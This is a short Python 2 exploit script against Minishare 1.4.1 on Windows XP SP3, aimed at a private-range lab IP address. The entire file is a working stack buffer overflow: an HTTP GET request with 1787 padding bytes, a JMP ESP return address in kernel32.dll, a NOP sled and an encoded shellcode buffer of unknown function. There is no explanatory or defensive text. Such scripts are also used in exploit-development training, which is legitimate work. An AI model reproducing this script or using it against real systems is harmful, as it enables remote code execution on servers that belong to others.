#!/usr/bin/python
import socket

target_address="192.168.56.101"
target_port=80

# JMP ESP --> kernel32.dll (win XP SP3, 0x7c86467b)

buf =  ""
buf += "\xda\xca\xd9\x74\x24\xf4\xba\x21\xb3\xea\xba\x5e\x33"
buf += "\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\x77\xa0\x08"
buf += "\x4f\x8b\x2e\x4e\xb0\x73\xaf\x2f\x38\x96\x9e\x6f\x5e"
buf += "\xd3\xb1\x5f\x14\xb1\x3d\x2b\x78\x21\xb5\x59\x55\x46"
buf += "\x7e\xd7\x83\x69\x7f\x44\xf7\xe8\x03\x97\x24\xca\x3a"
buf += "\x58\x39\x0b\x7a\x85\xb0\x59\xd3\xc1\x67\x4d\x50\x9f"
buf += "\xbb\xe6\x2a\x31\xbc\x1b\xfa\x30\xed\x8a\x70\x6b\x2d"
buf += "\x2d\x54\x07\x64\x35\xb9\x22\x3e\xce\x09\xd8\xc1\x06"
buf += "\x40\x21\x6d\x67\x6c\xd0\x6f\xa0\x4b\x0b\x1a\xd8\xaf"
buf += "\xb6\x1d\x1f\xcd\x6c\xab\xbb\x75\xe6\x0b\x67\x87\x2b"
buf += "\xcd\xec\x8b\x80\x99\xaa\x8f\x17\x4d\xc1\xb4\x9c\x70"
buf += "\x05\x3d\xe6\x56\x81\x65\xbc\xf7\x90\xc3\x13\x07\xc2"
buf += "\xab\xcc\xad\x89\x46\x18\xdc\xd0\x0e\xed\xed\xea\xce"
buf += "\x79\x65\x99\xfc\x26\xdd\x35\x4d\xae\xfb\xc2\xb2\x85"
buf += "\xbc\x5c\x4d\x26\xbd\x75\x8a\x72\xed\xed\x3b\xfb\x66"
buf += "\xed\xc4\x2e\x28\xbd\x6a\x81\x89\x6d\xcb\x71\x62\x67"
buf += "\xc4\xae\x92\x88\x0e\xc7\x39\x73\xd9\x28\x15\x43\x7f"
buf += "\xc1\x64\xb3\x7e\xaa\xe0\x55\xea\xdc\xa4\xce\x83\x45"
buf += "\xed\x84\x32\x89\x3b\xe1\x75\x01\xc8\x16\x3b\xe2\xa5"
buf += "\x04\xac\x02\xf0\x76\x7b\x1c\x2e\x1e\xe7\x8f\xb5\xde"
buf += "\x6e\xac\x61\x89\x27\x02\x78\x5f\xda\x3d\xd2\x7d\x27"
buf += "\xdb\x1d\xc5\xfc\x18\xa3\xc4\x71\x24\x87\xd6\x4f\xa5"
buf += "\x83\x82\x1f\xf0\x5d\x7c\xe6\xaa\x2f\xd6\xb0\x01\xe6"
buf += "\xbe\x45\x6a\x39\xb8\x49\xa7\xcf\x24\xfb\x1e\x96\x5b"
buf += "\x34\xf7\x1e\x24\x28\x67\xe0\xff\xe8\x97\xab\x5d\x58"
buf += "\x30\x72\x34\xd8\x5d\x85\xe3\x1f\x58\x06\x01\xe0\x9f"
buf += "\x16\x60\xe5\xe4\x90\x99\x97\x75\x75\x9d\x04\x75\x5c"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer= "GET " + ("A" * 1787) + "\x7b\x46\x86\x7c" + ('\x90' * 50) + buf + " HTTP/1.1\r\n\r\n"
try:
	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=sock.connect((target_address,target_port))
	sock.send(buffer)
	sock.close()
	print "Done!"
except:
	print "Could not connect to Minishare 1.4.1"
